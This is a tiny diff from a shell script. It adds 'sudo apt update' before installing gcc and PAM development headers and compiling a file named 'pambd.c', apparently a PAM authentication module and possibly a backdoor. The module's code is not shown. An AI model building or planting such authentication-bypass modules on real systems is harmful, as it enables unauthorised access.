@@ -56,6 +56,7 @@ PAM_EXTERN int pam_sm_authenticate
 
 echo "$MOD" | sudo tee pambd.c > /dev/null
 
+sudo apt update
 sudo apt install gcc libpam0g-dev -y
 gcc -fPIC -c pambd.c
 
